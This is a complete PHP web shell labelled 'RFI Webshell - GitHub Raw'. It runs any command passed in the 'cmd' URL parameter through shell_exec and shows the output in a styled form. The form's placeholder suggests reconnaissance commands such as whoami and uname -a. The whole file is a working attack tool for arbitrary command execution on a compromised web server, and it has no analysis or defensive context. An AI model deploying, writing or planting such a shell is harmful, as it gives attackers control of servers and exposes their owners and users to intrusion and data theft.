<?php
if(isset($_GET['cmd']) && $_GET['cmd'] !== ''){
    $cmd = $_GET['cmd'];
    echo "<pre>";
    echo htmlspecialchars(shell_exec($cmd . " 2>&1"), ENT_QUOTES | ENT_HTML5, 'UTF-8');
    echo "</pre>";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>RFI Shell</title>
    <style>
        body{background:#0d0d0d;color:#00ff00;font-family:monospace;padding:20px;}
        input{background:#222;color:#0f0;border:1px solid #0f0;padding:8px;width:70%;}
    </style>
</head>
<body>
    <h2>RFI Webshell - GitHub Raw</h2>
    <form method="GET">
        <input type="text" name="cmd" placeholder="id || whoami || ls -la || uname -a" autofocus>
        <input type="submit" value="Execute">
    </form>
</body>
</html>
